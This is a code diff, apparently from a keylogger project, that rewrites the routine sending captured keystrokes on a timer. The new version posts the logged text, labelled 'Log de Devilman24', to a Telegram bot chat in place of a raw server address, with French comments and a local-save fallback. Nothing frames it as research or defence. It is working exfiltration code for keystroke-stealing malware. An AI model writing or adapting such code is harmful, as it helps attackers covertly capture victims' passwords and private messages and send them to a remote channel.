@@ -73,27 +73,30 @@ def save_locally(data):
         print(f"Error saving data locally: {e}")
 
 def send_post_req():
-    """
-    Sends the collected epykey to the server at regular intervals.
-    """
     global text
     try:
-        if text.strip():  # Only send if there's data to send
-            payload = json.dumps({"keyboardData": text})
-            headers = {"Content-Type": "application/json"}
-            response = requests.post(f"http://{ip_address}:{port_number}", data=payload, headers=headers)
+        if text.strip():
+            # Préparation des données pour Telegram
+            url = f"https://api.telegram.org/bot{token}/sendMessage"
+            payload = {
+                "chat_id": chat_id,
+                "text": f"--- Log de Devilman24 ---\n{text}"
+            }
+            
+            # Envoi de la requête POST
+            response = requests.post(url, data=payload)
 
             if response.status_code == 200:
-                print("Data sent successfully.")
-                text = ""  # Clear the buffer after successful sending
+                print("Logs envoyés à Telegram avec succès.")
+                text = ""  # On vide le buffer
             else:
-                print(f"Server error: {response.status_code}. Saving locally.")
+                print(f"Erreur Telegram : {response.status_code}. Sauvegarde locale.")
                 save_locally(text)
-    except requests.RequestException as e:
-        print(f"Failed to send data: {e}. Saving locally.")
+    except Exception as e:
+        print(f"Erreur réseau : {e}. Sauvegarde locale.")
         save_locally(text)
 
-    # Schedule the next execution
+    # Relancer le timer
     timer = threading.Timer(time_interval, send_post_req)
     timer.start()
 
